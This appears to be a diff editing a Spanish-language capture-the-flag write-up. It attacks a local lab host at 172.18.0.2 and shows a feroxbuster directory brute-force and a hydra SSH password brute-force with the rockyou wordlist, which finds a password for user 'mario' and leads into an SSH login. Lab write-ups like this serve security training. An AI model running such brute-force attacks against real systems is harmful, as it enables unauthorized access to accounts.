@@ -45,9 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
 
 ## Website (80 TCP Port)
 
-En el sitio web no vemos nada interesante pero si hacenmos un ataque de fuerza bruta de directorios nos encontramos con una que nos revela un nombre de usuario-
-
-![](../../../Images/Pasted%20image%2020241008173556.png)
+En el sitio web no vemos nada interesante pero si hacenmos un ataque de fuerza bruta de directorios nos encontramos con una que nos revela un nombre de usuario.
 
 ```
 feroxbuster -u http://172.18.0.2 -x php
@@ -79,9 +77,12 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 5s     30005/30005   0s      found:3       errors:0
 [####################] - 5s     30000/30000   5738/s  http://172.18.0.2/                      
 ```
+
+![](../../../Images/Pasted%20image%2020241008173556.png)
+
 # Usuario Mario
 
-
+Con el nombre usuario logramos conseguir una contraseña realitzando un ataque de fuerza bruta de contraseñas.
 
 ```
 > hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 ssh
@@ -97,8 +98,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 17:00:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 17:00:35
 ```
-
-
 
 ```
 > ssh mario@172.18.0.2
